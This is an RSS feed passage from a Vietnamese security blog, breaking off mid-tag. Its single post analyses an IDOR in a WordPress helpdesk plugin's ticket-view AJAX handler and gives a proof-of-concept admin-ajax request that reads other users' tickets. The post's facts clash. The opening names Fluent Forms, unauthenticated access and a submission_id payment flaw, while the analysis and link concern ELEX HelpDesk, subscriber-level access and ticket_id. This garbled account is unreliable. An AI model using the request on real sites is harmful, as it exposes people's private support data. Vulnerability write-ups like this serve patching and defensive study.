<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/vi/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>vi</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Sun, 28 Dec 2025 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/vi/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-10039 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</link>
      <pubDate>Sun, 28 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; tồn tại &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;≤ 3.2.9&lt;/strong&gt; thông qua tham số &lt;code&gt;submission_id&lt;/code&gt; trong endpoint xác nhận thanh toán SCA.&#xA;Lỗ hổng cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;đánh dấu submission của người khác là failed&lt;/strong&gt;, gây gián đoạn quá trình thanh toán.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10039&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10039&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elex-helpdesk-customer-support-ticket-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.2.9&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký AJAX handler &lt;strong&gt;cho người dùng đã đăng nhập&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_eh_crm_ticket_single_view_client&amp;#39;, array( &amp;#39;CRM_Ajax&amp;#39;, &amp;#39;eh_crm_ticket_single_view_client&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; là hook dành cho người dùng đã đăng nhập (Subcriber+). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=eh_crm_ticket_single_view_client&lt;/code&gt; thì callback &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client() {&#xA;    if ( wp_verify_nonce( isset( $_POST[&amp;#39;nonce&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;nonce&amp;#39;] ) : &amp;#39;&amp;#39;, &amp;#39;wsdesk_nonce&amp;#39; ) ) {&#xA;        $ticket_id = isset( $_POST[&amp;#39;ticket_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;ticket_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $content   = self::eh_crm_ticket_single_view_client_gen( $ticket_id );&#xA;        wp_send_json_success( array( &amp;#39;page&amp;#39; =&amp;gt; $content ) );&#xA;        die;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra &lt;code&gt;nonce&lt;/code&gt; giúp chống CSRF&lt;/p&gt;&#xA;&lt;p&gt;Sau đó lấy &lt;code&gt;ticket_id&lt;/code&gt; từ request, gọi hàm &lt;code&gt;eh_crm_ticket_single_view_client_gen()&lt;/code&gt; xử lý, lấy nội dung của ticket tương ứng với &lt;code&gt;ticker_id&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng trả về nội dung dạng JSON.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) {&#xA;&#xA;    // Lấy dữ liệu ticket dựa trên ticket_id do user truyền vào&#xA;    $current      = eh_crm_get_ticket( array( &amp;#39;ticket_id&amp;#39; =&amp;gt; $ticket_id ) );&#xA;    $current_meta = eh_crm_get_ticketmeta( $ticket_id );&#xA;&#xA;    // Lấy thông tin người dùng nội bộ (agent/admin)&#xA;    $users_data = get_users( array(&#xA;        &amp;#39;role__in&amp;#39; =&amp;gt; array( &amp;#39;administrator&amp;#39;, &amp;#39;WSDesk_Agents&amp;#39;, &amp;#39;WSDesk_Supervisor&amp;#39; )&#xA;    ));&#xA;&#xA;    ...&#xA;&#xA;    // Render nội dung ticket (HTML output)&#xA;    echo esc_html( $current[0][&amp;#39;ticket_title&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_email&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_date&amp;#39;] );&#xA;&#xA;    ...&#xA;&#xA;    // Hiển thị nội dung hội thoại, file đính kèm, metadata&#xA;    self::eh_crm_ticket_reply_section_gen_client( $ticket_id );&#xA;&#xA;    ...&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;eh_crm_ticket_single_view_client_gen&lt;/code&gt; và &lt;code&gt;eh_crm_get_ticketmeta&lt;/code&gt; được gọi để truy xuất dữ liệu của ticket:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticket( $args, $fields = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;$query = wpFluent()-&amp;gt;table( tables: &amp;#39;wsdesk_tickets&amp;#39; )-&amp;gt;where( &amp;#39;ticket_trash&amp;#39;, 0 );&#xA;&#xA;&#x9;if ( null !== $fields ) {&#xA;&#x9;&#x9;$fields = is_array( $fields ) ? $fields : array( $fields );&#xA;&#x9;&#x9;foreach ( $fields as $field ) {&#xA;&#x9;&#x9;&#x9;$query-&amp;gt;select( $field );&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( is_array( $args ) ) {&#xA;&#x9;&#x9;foreach ( $args as $key =&amp;gt; $value ) {&#xA;&#x9;&#x9;&#x9;$allowed_fileds = array( &amp;#39;ticket_id&amp;#39;, &amp;#39;ticket_author&amp;#39;, &amp;#39;ticket_email&amp;#39;, &amp;#39;ticket_date&amp;#39;, &amp;#39;ticket_title&amp;#39;, &amp;#39;ticket_parent&amp;#39;, &amp;#39;ticket_category&amp;#39;, &amp;#39;ticket_vendor&amp;#39;, &amp;#39;ticket_trash&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( in_array( $key, $allowed_fileds, true ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$query-&amp;gt;where( $key, $value );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;$ticket = (array) $query-&amp;gt;first();&#xA;&#xA;&#x9;if ( ! $ticket ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#xA;&#x9;if ( isset( $ticket[&amp;#39;ticket_content&amp;#39;] ) ) {&#xA;&#x9;&#x9;$ticket[&amp;#39;ticket_content&amp;#39;] = wp_kses_post( $ticket[&amp;#39;ticket_content&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;return array( $ticket );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticketmeta( $id, $key = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;global $wpdb;&#xA;&#x9;$data     = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d&amp;#39;, (int) $id ), ARRAY_A );&#xA;&#x9;$retrived = array();&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;$data = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s&amp;#39;, (int) $id, $key ), ARRAY_A );&#xA;&#x9;}&#xA;&#x9;if ( ! $data ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;return maybe_unserialize( $data[0][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;for ( $i = 0; $i &amp;lt; count( $data ); $i&amp;#43;&amp;#43; ) {&#xA;&#x9;&#x9;$retrived[ $data[ $i ][&amp;#39;meta_key&amp;#39;] ] = maybe_unserialize( $data[ $i ][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;return maybe_unserialize( $retrived );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Không có bất kỳ kiểm tra nào để xác nhận người dùng hiện tại có phải là chủ sở hữu ticket hay không, có quyền xem ticket này hay không =&amp;gt; IDOR&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá v3.3.0&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#34; title=&#34;Bản vá v3.3.0&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá v3.3.0&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#39; alt=&#34;Patch&#34; height=&#34;693&#34; width=&#34;1888&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá v3.3.0&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã &lt;strong&gt;ngăn chặn IDOR bằng cách ràng buộc quyền truy cập theo người dùng&lt;/strong&gt;, cụ thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So sánh &lt;code&gt;ticket_author&lt;/code&gt; với &lt;code&gt;current_user_id&lt;/code&gt; để đảm bảo người xem là chủ sở hữu ticket&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cho phép truy cập nếu người dùng thuộc nhóm được cấp quyền (&lt;code&gt;administrator&lt;/code&gt;, &lt;code&gt;WSDesk_Agents&lt;/code&gt;, &lt;code&gt;WSDesk_Supervisor&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Từ chối mọi truy cập không hợp lệ trước khi trả dữ liệu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nhờ đó, không thể truy cập ticket của người khác chỉ bằng cách thay đổi &lt;code&gt;ticket_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subcriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=eh_crm_ticket_single_view_client&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Get ticket_id from request&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load ticket by ticket_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;No role validation&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Return full ticket data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User can view other users&amp;#39; tickets (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login với Subcriber+ user:&lt;/li&gt;&#xA;&lt;li&gt;Submit 1 ticket bất kì&lt;/li&gt;&#xA;&lt;li&gt;Tại bảng &lt;code&gt;Your Tickets&lt;/code&gt;, lấy &lt;code&gt;nonce&lt;/code&gt; bằng cách view source:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#34; title=&#34;Lấy nonce&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;513&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gửi request với &lt;code&gt;nonce&lt;/code&gt; vừa lấy được&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: Subcriber&amp;#43; cookie&#xA;&#xA;action=eh_crm_ticket_single_view_client&amp;amp;nonce=4de88a7186&amp;amp;ticket_id=any_ticket_id &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#39; alt=&#34;Result&#34; height=&#34;910&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thông tin trả về chứa nội dung của ticket và cả thông tin author của ticket&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do endpoint &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; &lt;strong&gt;không kiểm tra quyền sở hữu ticket&lt;/strong&gt;, chỉ dựa vào &lt;code&gt;ticket_id&lt;/code&gt; do người dùng cung cấp.&#xA;Điều này cho phép bất kỳ người dùng đã đăng nhập nào truy cập ticket của người khác → &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá khắc phục bằng cách:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So sánh &lt;code&gt;ticket_author&lt;/code&gt; với &lt;code&gt;current_user_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cho phép các role được cấp quyền truy cập&lt;/li&gt;&#xA;&lt;li&gt;Từ chối request nếu không hợp lệ trước khi trả dữ liệu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; &lt;strong&gt;không thay thế cho kiểm tra phân quyền&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Không được tin dữ liệu ID do client gửi lên&lt;/li&gt;&#xA;&lt;li&gt;Luôn kiểm tra &lt;strong&gt;ownership&lt;/strong&gt; trước khi truy xuất dữ liệu&lt;/li&gt;&#xA;&lt;li&gt;Authorization phải được xử lý ở backend, trước khi trả response&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 